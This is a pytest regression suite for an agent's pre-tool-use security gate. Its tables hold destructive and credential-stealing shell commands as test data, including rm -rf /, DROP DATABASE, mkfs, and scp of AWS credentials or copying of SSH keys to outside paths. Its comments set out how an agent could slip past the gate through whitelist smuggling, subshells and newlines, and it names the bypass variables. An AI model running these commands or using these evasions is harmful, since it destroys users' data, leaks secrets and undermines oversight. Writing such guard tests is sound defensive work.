#!/usr/bin/env python3
"""
Security-audit regression corpus for the pretool-unified-gate hook.

Table-driven allow/deny cases for each audit finding (tracks S1..S5). Every
closed bypass gets a DENY row; every legitimate near-miss gets an ALLOW row so
the fix cannot over-block. Grows one section per remediation PR.

Run with: python3 -m pytest hooks/tests/test_pretool_unified_gate_security.py -v
"""

import importlib.util
import io
import json
import os
from pathlib import Path
from unittest.mock import patch

import pytest

# ---------------------------------------------------------------------------
# Import the module under test
# ---------------------------------------------------------------------------

HOOK_PATH = Path(__file__).parent.parent / "pretool-unified-gate.py"

spec = importlib.util.spec_from_file_location("pretool_unified_gate_security", HOOK_PATH)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)

# All per-check bypass env vars, stripped for a clean baseline in every run.
_BYPASS_VARS = (
    "CLAUDE_GATE_BYPASS",
    "DANGEROUS_GUARD_BYPASS",
    "CREATION_GATE_BYPASS",
    "SENSITIVE_FILE_GUARD_BYPASS",
    "PUBLIC_SERVER_GUARD_BYPASS",
    "SYSADMIN_GUARD_BYPASS",
    "GUARD_INTEGRITY_BYPASS",
)

ALLOW = 0
DENY = 2


def _event(tool: str, **tool_input) -> str:
    return json.dumps({"tool_name": tool, "tool_input": tool_input})


def _run_main(stdin_payload: str, env: dict | None = None) -> int:
    """Invoke mod.main() in-process; return DENY (2) or ALLOW (0).

    The hook always exits 0 — the deny decision is the JSON permissionDecision
    on stdout, so that is what is detected here.
    """
    base_env = dict(os.environ)
    for var in _BYPASS_VARS:
        base_env.pop(var, None)
    base_env["CLAUDE_OPERATOR_PROFILE"] = "work"
    if env:
        base_env.update(env)

    stdout_capture = io.StringIO()
    with (
        patch.dict(os.environ, base_env, clear=True),
        patch.object(mod, "read_stdin", return_value=stdin_payload),
        patch("sys.stdout", stdout_capture),
        patch("sys.stderr", io.StringIO()),
    ):
        try:
            mod.main()
        except SystemExit:
            pass

    output = stdout_capture.getvalue().strip()
    if output:
        try:
            decision = json.loads(output).get("hookSpecificOutput", {}).get("permissionDecision")
            if decision == "deny":
                return DENY
        except (json.JSONDecodeError, AttributeError):
            pass
    return ALLOW


# ---------------------------------------------------------------------------
# S1a — dangerous-command whitelist containment
#
# _is_whitelisted was bare substring containment and a hit returned from the
# whole pattern loop, so a `.guard-whitelist` holding any benign substring
# (`node_modules`) disarmed every dangerous-command rule for any command that
# contained it. Now an entry must equal the FULL command, and a hit skips one
# rule instead of ending the scan.
# ---------------------------------------------------------------------------

WHITELIST_CASES = [
    # (case_id, command, whitelist_entries, expected)
    ("smuggle-substring-and", "echo node_modules && rm -rf /", ["node_modules"], DENY),
    ("smuggle-substring-semicolon", "echo node_modules; rm -rf /", ["node_modules"], DENY),
    ("smuggle-entry-is-prefix", "rm -rf . && rm -rf /", ["rm -rf ."], DENY),
    ("smuggle-entry-not-full-cmd", "echo cleanup && rm -rf /", ["echo cleanup"], DENY),
    ("exact-entry-allows", "rm -rf .", ["rm -rf ."], ALLOW),
    ("exact-entry-outer-whitespace", "  rm -rf .  ", ["rm -rf ."], ALLOW),
    ("unrelated-entry-still-blocks", "rm -rf /", ["rm -rf ./build"], DENY),
    ("empty-whitelist-still-blocks", "rm -rf /", [], DENY),
]


class TestDangerousWhitelistAnchoring:
    @pytest.mark.parametrize(("case_id", "command", "entries", "expected"), WHITELIST_CASES)
    def test_whitelist_case(self, case_id, command, entries, expected):
        with patch.object(mod, "_load_guard_whitelist", return_value=entries):
            assert _run_main(_event("Bash", command=command)) == expected, case_id

    def test_is_whitelisted_rejects_substring(self):
        assert mod._is_whitelisted("echo node_modules && rm -rf /", ["node_modules"]) is False

    def test_is_whitelisted_accepts_exact(self):
        assert mod._is_whitelisted("rm -rf ./build", ["rm -rf ./build"]) is True


# ---------------------------------------------------------------------------
# S1b(i) — .guard-whitelist / .guard-patterns are guard control-plane files
#
# Writing either file IS the disarm act (S1a matches whitelist entries against
# commands; .guard-patterns adds sensitive-file exceptions). No agent flow
# legitimately writes them, so Write/Edit deny anywhere; Read stays warn-only.
# ---------------------------------------------------------------------------

GUARD_CONFIG_CASES = [
    ("write-guard-whitelist", "Write", "/some/project/.guard-whitelist", DENY),
    ("write-guard-patterns", "Write", "/some/project/.guard-patterns", DENY),
    ("edit-guard-whitelist", "Edit", "/some/project/.guard-whitelist", DENY),
    ("edit-guard-patterns", "Edit", "/some/project/.guard-patterns", DENY),
    ("read-guard-whitelist-warn-only", "Read", "/some/project/.guard-whitelist", ALLOW),
    ("write-similar-name-allowed", "Write", "/some/project/.guard-whitelist.md", ALLOW),
]


class TestGuardConfigFilesProtected:
    @pytest.mark.parametrize(("case_id", "tool", "file_path", "expected"), GUARD_CONFIG_CASES)
    def test_guard_config_case(self, case_id, tool, file_path, expected):
        assert _run_main(_event(tool, file_path=file_path)) == expected, case_id


# ---------------------------------------------------------------------------
# S1b(ii) — guard self-protection for live enforcement files
#
# ~/.claude/hooks symlinks into the repo, so Write/Edit to hooks/<hook>.py via
# either path changes LIVE enforcement code; settings.json's env block can set
# *_BYPASS=1. check_guard_integrity denies both unless the containing repo is
# on a feature branch (the documented branch → PR → review flow). The deployed
# ~/.claude/settings.json sits outside any repo, so it is always denied.
# ---------------------------------------------------------------------------


class TestGuardIntegrity:
    def _run(
        self,
        file_path: str,
        *,
        tool: str = "Edit",
        live_dir: Path | None = None,
        feature_branch: bool = False,
        env: dict | None = None,
    ) -> int:
        with (
            patch.object(mod, "_live_hooks_dir", return_value=live_dir),
            patch.object(mod, "_is_worktree_on_feature_branch", return_value=feature_branch),
        ):
            return _run_main(_event(tool, file_path=file_path), env=env)

    def test_live_hook_edit_on_main_denied(self, tmp_path):
        live = tmp_path / "repo" / "hooks"
        live.mkdir(parents=True)
        assert self._run(str(live / "pretool-unified-gate.py"), live_dir=live) == DENY

    def test_live_hook_write_on_main_denied(self, tmp_path):
        live = tmp_path / "repo" / "hooks"
        live.mkdir(parents=True)
        assert self._run(str(live / "new-hook.py"), tool="Write", live_dir=live) == DENY

    def test_live_hook_edit_on_feature_branch_allowed(self, tmp_path):
        live = tmp_path / "repo" / "hooks"
        live.mkdir(parents=True)
        assert self._run(str(live / "pretool-unified-gate.py"), live_dir=live, feature_branch=True) == ALLOW

    def test_symlinked_deploy_path_resolves_to_live_dir(self, tmp_path):
        """The deployed symlink path and the repo path are the SAME protected file."""
        repo_hooks = tmp_path / "repo" / "hooks"
        repo_hooks.mkdir(parents=True)
        (repo_hooks / "gate.py").write_text("x")
        deployed = tmp_path / "home" / ".claude" / "hooks"
        deployed.parent.mkdir(parents=True)
        deployed.symlink_to(repo_hooks)
        live = deployed.resolve()
        # Addressed via the deployed symlink path — still detected as live code.
        assert self._run(str(deployed / "gate.py"), live_dir=live) == DENY
        # Addressed via the repo working-copy path — same resolved dir, detected.
        assert self._run(str(repo_hooks / "gate.py"), live_dir=live) == DENY

    def test_deployed_settings_json_denied(self, tmp_path):
        settings = tmp_path / "home" / ".claude" / "settings.json"
        settings.parent.mkdir(parents=True)
        assert self._run(str(settings), tool="Write") == DENY

    def test_settings_local_json_denied(self, tmp_path):
        settings = tmp_path / "home" / ".claude" / "settings.local.json"
        settings.parent.mkdir(parents=True)
        assert self._run(str(settings), tool="Write") == DENY

    def test_repo_settings_json_on_feature_branch_allowed(self, tmp_path):
        settings = tmp_path / "repo" / ".claude" / "settings.json"
        settings.parent.mkdir(parents=True)
        assert self._run(str(settings), feature_branch=True) == ALLOW

    def test_settings_json_outside_claude_dir_allowed(self, tmp_path):
        settings = tmp_path / "app" / "config" / "settings.json"
        settings.parent.mkdir(parents=True)
        assert self._run(str(settings), tool="Write") == ALLOW

    def test_unrelated_file_allowed(self, tmp_path):
        assert self._run(str(tmp_path / "src" / "app.py"), tool="Write") == ALLOW

    def test_bypass_env_allows(self, tmp_path):
        live = tmp_path / "repo" / "hooks"
        live.mkdir(parents=True)
        assert self._run(str(live / "gate.py"), live_dir=live, env={"GUARD_INTEGRITY_BYPASS": "1"}) == ALLOW

    def test_no_live_dir_skips_hook_protection(self, tmp_path):
        """CI checkouts without ~/.claude/hooks must not false-positive."""
        assert self._run(str(tmp_path / "hooks" / "some-hook.py"), tool="Write") == ALLOW

    def test_feature_branch_allow_emits_audit_line(self, tmp_path, capsys):
        live = tmp_path / "repo" / "hooks"
        live.mkdir(parents=True)
        with (
            patch.object(mod, "_live_hooks_dir", return_value=live),
            patch.object(mod, "_is_worktree_on_feature_branch", return_value=True),
        ):
            mod.check_guard_integrity(str(live / "gate.py"))
        assert "[guard-integrity] AUDIT" in capsys.readouterr().err

    def test_deny_message_does_not_advertise_bypass(self, tmp_path):
        """The deny text must not teach the disarm switch (audit S5 posture)."""
        live = tmp_path / "repo" / "hooks"
        live.mkdir(parents=True)
        stdout_capture = io.StringIO()
        with (
            patch.object(mod, "_live_hooks_dir", return_value=live),
            patch.object(mod, "_is_worktree_on_feature_branch", return_value=False),
            patch("sys.stdout", stdout_capture),
            patch("sys.stderr", io.StringIO()),
            pytest.raises(SystemExit),
        ):
            mod.check_guard_integrity(str(live / "gate.py"))
        assert "GUARD_INTEGRITY_BYPASS" not in stdout_capture.getvalue()


# ---------------------------------------------------------------------------
# S1 — still-blocking regression rows (the fix must not loosen anything)
# ---------------------------------------------------------------------------

STILL_BLOCKING_CASES_S1 = [
    ("rm-rf-root", "rm -rf /"),
    ("rm-fr-root", "rm -fr /"),
    ("rm-rf-root-star", "rm -rf /*"),
    ("rm-rf-home", "rm -rf ~"),
    ("rm-rf-dot", "rm -rf ."),
    ("drop-database", "psql -c 'DROP DATABASE prod'"),
    ("chmod-777", "chmod 777 /etc/passwd"),
    ("mkfs", "mkfs.ext4 /dev/sdb1"),
]


class TestStillBlockingS1:
    @pytest.mark.parametrize(("case_id", "command"), STILL_BLOCKING_CASES_S1)
    def test_still_blocked_without_whitelist(self, case_id, command):
        with patch.object(mod, "_load_guard_whitelist", return_value=[]):
            assert _run_main(_event("Bash", command=command)) == DENY, case_id


# ---------------------------------------------------------------------------
# S2 — destructive-command matching
#
# The four `rm -rf` rules were end-anchored on four literal command shapes
# (`/\s*$`, `~/?(\s|$)`, `\./?(\s|$)`), so any trailing argument, comment,
# `--` end-of-options, repeated slash, variable home, or bare system dir
# walked straight through. Replaced by a token walk over each `rm`
# occurrence's arguments that matches protected TARGETS.
#
# The force-push rules hardcoded flag-before-branch order, so
# `git push origin main --force` and the `+main` force refspec passed.
# Replaced by an order-independent token walk.
#
# `_command_token` did not understand compound syntax, so a command wrapped in
# a subshell, a brace group, or a conditional/loop body resolved to a
# non-executable token and dodged every command-anchored guard.
# ---------------------------------------------------------------------------

RM_TARGET_CASES = [
    # (case_id, command, expected)
    # -- bypasses closed by this PR (all verified ALLOW before the fix) --
    ("no-preserve-root", "rm -rf / --no-preserve-root", DENY),
    ("trailing-comment", "rm -rf / # cleanup", DENY),
    ("end-of-options", "rm -rf -- /", DENY),
    ("double-slash", "rm -rf //", DENY),
    ("home-var", "rm -rf $HOME", DENY),
    ("home-var-braced", "rm -rf ${HOME}", DENY),
    ("project-dir-var", "rm -rf $CLAUDE_PROJECT_DIR", DENY),
    ("system-dir-etc", "rm -rf /etc", DENY),
    ("system-dir-usr-trailing-slash", "rm -rf /usr/", DENY),
    ("system-dir-glob", "rm -rf /var/" + "*", DENY),
    ("user-home", "rm -rf /home/feedgen", DENY),
    ("flags-after-target", "rm -r / -f", DENY),
    # -- must STILL block (verified blocking before the fix) --
    ("root", "rm -rf /", DENY),
    ("root-glob", "rm -rf /" + "*", DENY),
    ("tilde", "rm -rf ~", DENY),
    ("dot", "rm -rf .", DENY),
    ("fr-order", "rm -fr /", DENY),
    ("separate-flags", "rm -r -f /", DENY),
    ("long-flags", "rm --recursive --force /", DENY),
    ("xargs", "xargs rm -rf /", DENY),
    ("env-prefix", "env rm -rf /", DENY),
    ("command-builtin", "command rm -rf /", DENY),
    ("backslash-escaped", "\\rm -rf /", DENY),
    ("absolute-path", "/bin/rm -rf /", DENY),
    ("inside-sh-c", 'sh -c "rm -rf /"', DENY),
    ("after-cd-chain", "cd /etc && rm -rf .", DENY),
    # -- legitimate work must stay allowed (no over-block) --
    ("relative-build", "rm -rf build", ALLOW),
    ("nested-relative", "rm -rf ./build/dist", ALLOW),
    ("node-modules", "rm -rf node_modules", ALLOW),
    ("under-home", "rm -rf ~/scratch/tmpdir", ALLOW),
    ("deep-under-user-home", "rm -rf /home/feedgen/vexjoy-agent/tmp", ALLOW),
    ("deep-under-system-dir", "rm -rf /var/tmp/mycache", ALLOW),
    ("no-recursive-flag", "rm -f somefile.txt", ALLOW),
    ("recursive-without-force", "rm -r /", ALLOW),
    ("later-command-args-not-attached", "rm -rf build; ls /", ALLOW),
    ("mention-in-echo-arg", "echo 'cleaning build dir'", ALLOW),
]


class TestRmDestructiveTargets:
    @pytest.mark.parametrize(("case_id", "command", "expected"), RM_TARGET_CASES)
    def test_rm_case(self, case_id, command, expected):
        with patch.object(mod, "_load_guard_whitelist", return_value=[]):
            assert _run_main(_event("Bash", command=command)) == expected, case_id

    def test_full_command_whitelist_entry_still_skips_rule(self):
        with patch.object(mod, "_load_guard_whitelist", return_value=["rm -rf /etc"]):
            assert _run_main(_event("Bash", command="rm -rf /etc")) == ALLOW

    def test_substring_whitelist_entry_does_not_disarm(self):
        with patch.object(mod, "_load_guard_whitelist", return_value=["/etc"]):
            assert _run_main(_event("Bash", command="rm -rf /etc")) == DENY


FORCE_PUSH_CASES = [
    # -- bypasses closed by this PR --
    ("flag-after-branch", "git push origin main --force", DENY),
    ("flag-after-branch-short", "git push origin master -f", DENY),
    ("plus-refspec", "git push origin +main", DENY),
    ("plus-refspec-full", "git push origin +refs/heads/master", DENY),
    # -- must STILL block --
    ("flag-before-branch", "git push --force origin main", DENY),
    ("short-flag-before-branch", "git push -f origin master", DENY),
    # -- legitimate work stays allowed --
    ("feature-branch-force", "git push --force origin my-feature", ALLOW),
    ("force-with-lease-main", "git push --force-with-lease origin main", ALLOW),
]


class TestForcePushOrderIndependence:
    @pytest.mark.parametrize(("case_id", "command", "expected"), FORCE_PUSH_CASES)
    def test_force_push_case(self, case_id, command, expected):
        # `git push` also trips the pr-workflow submission gate; assert on the
        # dangerous-command walk directly so this row tests only force-push logic.
        got = DENY if mod._force_push_protected(command) else ALLOW
        assert got == expected, case_id


COMPOUND_TOKEN_CASES = [
    # -- bypasses closed by this PR (all verified ALLOW before the fix) --
    ("subshell", "(python3 -m http.server)", DENY),
    ("brace-group", "{ python3 -m http.server; }", DENY),
    ("if-then", "if true; then python3 -m http.server --bind 0.0.0.0; fi", DENY),
    ("while-do", "while :; do python3 -m http.server --bind 0.0.0.0; done", DENY),
    ("stacked-openers", "( { python3 -m http.server; } )", DENY),
    # -- benign compound commands stay allowed --
    ("subshell-ls", "(ls -la)", ALLOW),
    ("brace-group-echo", "{ echo hi; }", ALLOW),
    ("if-then-echo", "if true; then echo hi; fi", ALLOW),
    ("while-do-echo", "while :; do echo hi; done", ALLOW),
]


class TestCompoundCommandToken:
    @pytest.mark.parametrize(("case_id", "command", "expected"), COMPOUND_TOKEN_CASES)
    def test_compound_case(self, case_id, command, expected):
        assert _run_main(_event("Bash", command=command)) == expected, case_id

    @pytest.mark.parametrize(
        ("segment", "expected"),
        [
            ("(python3 -m http.server)", "python3"),
            ("{ python3 -m http.server; }", "python3"),
            ("then vite --host 0.0.0.0", "vite"),
            ("do npx serve", "serve"),
            ("else python3 -m http.server", "python3"),
            ("ls -la", "ls"),
        ],
    )
    def test_command_token_resolves_through_compound_syntax(self, segment, expected):
        assert mod._command_token(segment) == expected


# ---------------------------------------------------------------------------
# S3 — public-bind guard
#
# Three gaps, all verified ALLOWED before the fix:
#
# 1. One newline disabled the whole guard. `_SEGMENT_SPLIT_RE` does not split
#    on `\n` (heredoc safety), so `_DISPLAY_CMD_RE` saw a leading `echo`/`cat`/
#    `#` on line 1 and suppressed every later line. Fixed with the same
#    per-line recursion `_check_sysadmin_segment` already used for this class.
#
# 2. Bind-flag scans short-circuited on the FIRST match, but shells honor the
#    LAST flag, so `--bind 127.0.0.1 --bind 0.0.0.0` (which binds all
#    interfaces) was allowed. Now the last occurrence decides — matching
#    `_scan_host_flags`' documented intent in both directions.
#
# 3. `serve` was not a known server and `-l` was not a bind flag, so
#    `npx serve -l tcp://0.0.0.0:3000` — named forbidden by the home
#    CLAUDE.md — was allowed.
# ---------------------------------------------------------------------------

NEWLINE_SUPPRESSION_CASES = [
    # (case_id, command, expected)
    # -- bypasses closed by this PR --
    ("echo-then-server", "echo hi\npython3 -m http.server", DENY),
    ("cat-then-server", "cat README.md\npython3 -m http.server 8080", DENY),
    ("comment-then-vite", "# note\nvite --host 0.0.0.0", DENY),
    ("echo-then-uvicorn", "echo starting\nuvicorn app:app --host 0.0.0.0", DENY),
    ("server-on-third-line", "echo a\necho b\nvite --host 0.0.0.0", DENY),
    # -- display-command suppression still works within a single line --
    ("echo-quoting-server", "echo 'python3 -m http.server'", ALLOW),
    ("cat-alone", "cat README.md", ALLOW),
    ("echo-then-benign", "echo hi\nls -la", ALLOW),
    ("comment-then-benign", "# note\necho hi", ALLOW),
]


class TestNewlineDoesNotSuppressPublicBindGuard:
    @pytest.mark.parametrize(("case_id", "command", "expected"), NEWLINE_SUPPRESSION_CASES)
    def test_newline_case(self, case_id, command, expected):
        assert _run_main(_event("Bash", command=command)) == expected, case_id


LAST_BIND_FLAG_CASES = [
    # -- bypasses closed by this PR: public flag LAST wins --
    ("py-loopback-then-public", "python3 -m http.server --bind 127.0.0.1 --bind 0.0.0.0", DENY),
    ("http-server-loopback-then-public", "http-server -a 127.0.0.1 -a 0.0.0.0", DENY),
    ("uvicorn-loopback-then-public", "uvicorn app:app --host 127.0.0.1 --host 0.0.0.0", DENY),
    # -- the mirror case: loopback LAST genuinely binds loopback --
    ("py-public-then-loopback", "python3 -m http.server --bind 0.0.0.0 --bind 127.0.0.1", ALLOW),
    ("http-server-public-then-loopback", "http-server -a 0.0.0.0 -a 127.0.0.1", ALLOW),
    # -- single-flag behavior unchanged --
    ("py-public-only", "python3 -m http.server --bind 0.0.0.0", DENY),
    ("py-loopback-only", "python3 -m http.server --bind 127.0.0.1", ALLOW),
    ("py-no-flag-blocks-by-default", "python3 -m http.server", DENY),
    ("http-server-no-flag-blocks-by-default", "http-server", DENY),
    ("uvicorn-loopback-only", "uvicorn app:app --host 127.0.0.1", ALLOW),
]


class TestLastBindFlagWins:
    @pytest.mark.parametrize(("case_id", "command", "expected"), LAST_BIND_FLAG_CASES)
    def test_last_flag_case(self, case_id, command, expected):
        assert _run_main(_event("Bash", command=command)) == expected, case_id


SERVE_CASES = [
    # -- bypass closed by this PR --
    ("npx-serve-public", "npx serve -l tcp://0.0.0.0:3000", DENY),
    ("serve-public", "serve -l tcp://0.0.0.0:3000", DENY),
    ("serve-public-ipv6", "serve -l tcp://[::]:3000", DENY),
    ("serve-valueless-host", "serve --host", DENY),
    # -- loopback serve stays allowed (scheme/port must not read as a host) --
    ("npx-serve-loopback", "npx serve -l tcp://127.0.0.1:3000", ALLOW),
    ("serve-loopback", "serve -l tcp://localhost:3000", ALLOW),
    ("serve-loopback-ipv6", "serve -l tcp://[::1]:3000", ALLOW),
    # -- `-l` is scoped to the serve command, never scanned globally --
    ("ls-l-not-a-bind-flag", "ls -l /tmp", ALLOW),
    ("git-log-l-not-a-bind-flag", "git log -1 --oneline", ALLOW),
]


class TestServeStaticServer:
    @pytest.mark.parametrize(("case_id", "command", "expected"), SERVE_CASES)
    def test_serve_case(self, case_id, command, expected):
        assert _run_main(_event("Bash", command=command)) == expected, case_id


class TestHostValueNormalization:
    @pytest.mark.parametrize(
        ("value", "expected_public"),
        [
            ("tcp://0.0.0.0:3000", True),
            ("tcp://127.0.0.1:3000", False),
            ("tcp://localhost:3000", False),
            ("tcp://[::1]:3000", False),
            ("tcp://[::]:3000", True),
            ("0.0.0.0:8080", True),
            ("127.0.0.1:8080", False),
            ("0.0.0.0", True),
            ("127.0.0.1", False),
            ("::1", False),
            ("[::]", True),
            ("localhost", False),
            ("192.168.1.10", True),
        ],
    )
    def test_host_is_public(self, value, expected_public):
        assert mod._host_is_public(value) is expected_public


class TestQuoteAwareLineSplit:
    """Per-line recursion must split only on UNQUOTED newlines.

    A newline inside a quoted argument is data. Splitting on it manufactures a
    fake second command out of the quoted tail (false positive), and a split
    that returns the segment unchanged would recurse forever.
    """

    @pytest.mark.parametrize(
        ("case_id", "command", "expected"),
        [
            ("printf-quoted-newline", "printf '%s\n' 'python3 -m http.server'", ALLOW),
            ("heredoc-body-is-data", "cat <<'EOF'\npython3 -m http.server\nEOF", ALLOW),
            ("double-quoted-newline", 'echo "line1\npython3 -m http.server"', ALLOW),
            ("unquoted-newline-still-splits", "echo hi\npython3 -m http.server", DENY),
            ("quoted-then-unquoted", "echo 'a\nb'\nvite --host 0.0.0.0", DENY),
        ],
    )
    def test_line_split_case(self, case_id, command, expected):
        assert _run_main(_event("Bash", command=command)) == expected, case_id

    @pytest.mark.parametrize(
        ("text", "expected"),
        [
            ("a\nb", ["a", "b"]),
            ("printf '%s\n' x", ["printf '%s\n' x"]),
            ('echo "a\nb"', ['echo "a\nb"']),
            ("echo 'a\nb'\nls", ["echo 'a\nb'", "ls"]),
            ("one line", ["one line"]),
        ],
    )
    def test_unquoted_line_split(self, text, expected):
        assert mod._unquoted_line_split(text) == expected


# ---------------------------------------------------------------------------
# S4 — sensitive-file guard coverage
#
# `check_sensitive_file` ran only in the Write/Edit/Read tool branches, so the
# identical acts spelled as a shell command were never examined at all:
# `cat ~/.ssh/id_ed25519`, `cp ~/.env /var/www/html/`, and `cat > ~/.env` all
# passed while the Write-tool equivalents were denied.
#
# Bash posture mirrors the tool branches rather than inventing a stricter one:
# copy/write verbs and redirect targets DENY (they duplicate or mutate a
# secret, which is what Write/Edit deny); read verbs WARN (same as the Read
# tool, whose docstring explains why blocking a project's own .env read breaks
# common legitimate work).
#
# `_SENSITIVE_EXCEPTIONS` also matched `/fixtures/` anywhere in a path, so a
# real credential file at `/home/feedgen/fixtures/.env` was excused from every
# check. Directory exceptions now must resolve inside the repo worktree.
# ---------------------------------------------------------------------------


def _run_bash_capturing_stderr(command: str) -> tuple[int, str]:
    """Return (decision, stderr) so WARN-only outcomes can be asserted."""
    base_env = dict(os.environ)
    for var in _BYPASS_VARS:
        base_env.pop(var, None)
    base_env["CLAUDE_OPERATOR_PROFILE"] = "work"
    stdout_capture, stderr_capture = io.StringIO(), io.StringIO()
    with (
        patch.dict(os.environ, base_env, clear=True),
        patch.object(mod, "read_stdin", return_value=_event("Bash", command=command)),
        patch("sys.stdout", stdout_capture),
        patch("sys.stderr", stderr_capture),
    ):
        try:
            mod.main()
        except SystemExit:
            pass
    decision = ALLOW
    out = stdout_capture.getvalue().strip()
    if out:
        try:
            if json.loads(out).get("hookSpecificOutput", {}).get("permissionDecision") == "deny":
                decision = DENY
        except (json.JSONDecodeError, AttributeError):
            pass
    return decision, stderr_capture.getvalue()


SENSITIVE_BASH_DENY_CASES = [
    # (case_id, command) — copy/write reaching a secret must DENY
    ("redirect-truncates-env", "cat > ~/.env"),
    ("redirect-append-env", "echo x >> /home/feedgen/.env"),
    ("redirect-git-credentials", "cat secrets > /home/feedgen/.git-credentials"),
    ("cp-env-to-webroot", "cp ~/.env /var/www/html/"),
    ("cp-ssh-key-out", "cp /home/feedgen/.ssh/id_rsa /tmp/k"),
    ("mv-netrc", "mv /home/feedgen/.netrc /tmp/n"),
    ("scp-aws-credentials", "scp /home/feedgen/.aws/credentials host:/tmp"),
    ("after-newline", "echo hi\ncp ~/.env /tmp/e"),
    ("after-chain", "cd /tmp && cp /home/feedgen/.env ."),
]


class TestSensitiveBashDeny:
    @pytest.mark.parametrize(("case_id", "command"), SENSITIVE_BASH_DENY_CASES)
    def test_denied(self, case_id, command):
        decision, _ = _run_bash_capturing_stderr(command)
        assert decision == DENY, case_id


SENSITIVE_BASH_WARN_CASES = [
    ("cat-ssh-key", "cat ~/.ssh/id_ed25519"),
    ("less-aws-credentials", "less /home/feedgen/.aws/credentials"),
    ("head-env", "head -5 /home/feedgen/.env"),
    ("cat-git-credentials", "cat /home/feedgen/.git-credentials"),
    ("cat-netrc", "cat /home/feedgen/.netrc"),
    ("cat-gh-hosts", "cat /home/feedgen/.config/gh/hosts.yml"),
    ("cat-envrc", "cat /home/feedgen/proj/.envrc"),
    ("base64-ssh-key", "base64 /home/feedgen/.ssh/id_rsa"),
]


class TestSensitiveBashWarn:
    @pytest.mark.parametrize(("case_id", "command"), SENSITIVE_BASH_WARN_CASES)
    def test_warns_but_allows(self, case_id, command):
        decision, stderr = _run_bash_capturing_stderr(command)
        assert decision == ALLOW, f"{case_id}: read verbs match the Read tool's warn posture"
        assert "[sensitive-file-guard] ADVISORY" in stderr, case_id


SENSITIVE_BASH_CLEAN_CASES = [
    ("cat-readme", "cat README.md"),
    ("cat-env-example", "cat .env.example"),
    ("ls-ssh-dir", "ls -la /home/feedgen/.ssh"),
    ("git-status", "git status --short"),
    ("cp-readme", "cp README.md /tmp/r"),
    ("redirect-to-tmp", "echo hi > /tmp/out.txt"),
    ("cat-hook-source", "cat hooks/pretool-unified-gate.py"),
    ("grep-token-word", "grep -r token ."),
]


class TestSensitiveBashNoFalsePositives:
    @pytest.mark.parametrize(("case_id", "command"), SENSITIVE_BASH_CLEAN_CASES)
    def test_clean(self, case_id, command):
        decision, stderr = _run_bash_capturing_stderr(command)
        assert decision == ALLOW, case_id
        assert "[sensitive-file-guard]" not in stderr, case_id


class TestSensitiveExceptionScoping:
    """Directory exceptions must resolve inside the repo worktree."""

    @pytest.mark.parametrize(
        ("case_id", "relative", "expected"),
        [
            ("fixtures-in-repo", "fixtures/.env", ALLOW),
            ("testdata-in-repo", "testdata/credentials.json", ALLOW),
            ("dunder-fixtures-in-repo", "__fixtures__/credentials.json", ALLOW),
        ],
    )
    def test_in_repo_exception_allowed(self, case_id, relative, expected):
        path = str(Path.cwd() / relative)
        assert _run_main(_event("Write", file_path=path, content="x")) == expected, case_id

    @pytest.mark.parametrize(
        ("case_id", "path"),
        [
            ("fixtures-in-home", "/home/feedgen/fixtures/.env"),
            ("testdata-in-home", "/home/feedgen/testdata/credentials.json"),
            ("fixtures-in-tmp", "/tmp/fixtures/.env"),
        ],
    )
    def test_out_of_repo_exception_denied(self, case_id, path):
        assert _run_main(_event("Write", file_path=path, content="x")) == DENY, case_id

    def test_suffix_exception_still_applies_anywhere(self):
        assert _run_main(_event("Write", file_path="/home/feedgen/.env.example", content="x")) == ALLOW


NEW_SENSITIVE_PATTERN_CASES = [
    ("git-credentials", "/home/feedgen/.git-credentials"),
    ("netrc", "/home/feedgen/.netrc"),
    ("gh-hosts-yml", "/home/feedgen/.config/gh/hosts.yml"),
    ("envrc", "/home/feedgen/proj/.envrc"),
]


class TestNewSensitivePatterns:
    """Credential stores the home CLAUDE.md names that the list previously missed."""

    @pytest.mark.parametrize(("case_id", "path"), NEW_SENSITIVE_PATTERN_CASES)
    def test_write_denied(self, case_id, path):
        assert _run_main(_event("Write", file_path=path, content="x")) == DENY, case_id

    @pytest.mark.parametrize(("case_id", "path"), NEW_SENSITIVE_PATTERN_CASES)
    def test_matches_sensitive(self, case_id, path):
        assert mod._matches_sensitive(path) is not None, case_id

    @pytest.mark.parametrize(
        "path",
        [
            "/home/feedgen/proj/README.md",
            "/home/feedgen/proj/.envrc.example",
            "/home/feedgen/.config/gh/config.yml",
        ],
    )
    def test_near_miss_not_sensitive(self, path):
        assert mod._matches_sensitive(path) is None


class TestSensitiveBashPreExistingPatterns:
    """S1's guard-config pattern must still fire through the new Bash path."""

    def test_redirect_to_guard_whitelist_denied(self):
        decision, _ = _run_bash_capturing_stderr("echo 'rm -rf /' > /home/feedgen/vexjoy-agent/.guard-whitelist")
        assert decision == DENY
